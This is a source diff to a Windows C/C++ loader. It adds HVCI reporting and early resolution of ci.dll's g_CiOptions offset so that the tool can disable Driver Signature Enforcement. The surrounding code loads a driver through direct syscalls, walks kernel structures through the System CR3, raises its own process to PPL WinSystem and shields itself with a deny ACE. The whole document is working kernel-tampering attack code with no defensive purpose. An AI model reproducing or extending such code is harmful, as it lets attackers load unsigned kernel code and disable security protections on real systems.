@@ -230,6 +230,31 @@ static int RunBody() {
         return 1;
     }
 
+    // Show what the platform enforces, so a later failure has it in the log.
+    // VBS/HVCI changes the memory budget, so the commit numbers further down are
+    // not comparable with a non-VBS boot.
+    {
+        typedef NTSTATUS(WINAPI* pNtQSI)(ULONG, PVOID, ULONG, PULONG);
+        auto NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
+                                            "NtQuerySystemInformation");
+        ULONG ciOptions = 0, need = 0;
+        if (NtQSI && NtQSI(103, &ciOptions, sizeof(ciOptions), &need) == 0)
+            printf("[+] code integrity options: 0x%X%s\n", ciOptions,
+                   (ciOptions & 0x20) ? "  (HVCI: kernel-mode code integrity)" : "");
+        else
+            printf("[+] code integrity options: not available\n");
+        if (IsProcessorFeaturePresent(21))  // PF_VIRT_FIRMWARE_ENABLED
+            printf("[+] virtualization: enabled in firmware\n");
+    }
+
+    // The DSE step needs ci.dll!g_CiOptions' RVA, and finding it means
+    // downloading that module's PDB and running DIA over it - by far the most
+    // memory-hungry step in the loader. Do it now, while memory is still
+    // plentiful: after the physical window has committed its gigabytes the same
+    // work can fail with STATUS_NO_MEMORY, which is what it did under HVCI.
+    ULONG64 ciOptionsRva = 0;
+    bool haveCiOptionsRva = ResolveCiOptionsRva(&ciOptionsRva);
+
     printf("\n[*] Enabling SeLoadDriverPrivilege...\n");
     {
         HANDLE tokenHandle;
@@ -484,7 +509,7 @@ static int RunBody() {
     DoSyscall(sc.NtClose, (ULONG_PTR)deviceHandle, 0, 0, 0);
 
     status = DoSyscall(sc.NtUnloadDriver, (ULONG_PTR)&servicePath, 0, 0, 0);
-    printf("[%c] Driver unloaded\n", status == 0 ? '+' : '-');
+    printf("[%c] Driver unloaded\n\n", status == 0 ? '+' : '-');
 
     if (mmPrepared && status == 0)
         FinishMmCleanup(&mmCtx);
@@ -557,7 +582,7 @@ static int RunBody() {
             printf("[%c] PPL: 0x%02X%s\n", (s == 0 && level == PPL_FULL_WINSYSTEM) ? '+' : '-',
                    level,
                    (s == 0 && level == PPL_FULL_WINSYSTEM) ? "" : "  (wanted 0x44)");
-            printf("    raw Protection now: 0x%02X\n", level);
+            printf("    PPL value now: 0x%02X\n", level);
         }
     }
 
@@ -566,7 +591,7 @@ static int RunBody() {
     {
         ULONG64 ourEproc = 0;
         if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEproc)) {
-            printf("[*] raw Protection: ours 0x%02X\n",
+            printf("[*] PPL value: ours 0x%02X\n",
                    WindowGetProcessProtection(systemCr3, &kOffsets, ourEproc));
         }
         ReportChildProtection(systemCr3, &kOffsets, L"conhost.exe");
@@ -592,7 +617,7 @@ static int RunBody() {
     printf("[+] System CR3: 0x%llX\n", systemCr3);
 
     g_Phase = PH_DSE;
-    DisableDSE(systemCr3, &kOffsets);
+    DisableDSE(systemCr3, &kOffsets, haveCiOptionsRva, ciOptionsRva);
 
     // Last: the deny ACE covers this process too, so nothing that needs to open
     // it may run after this point.
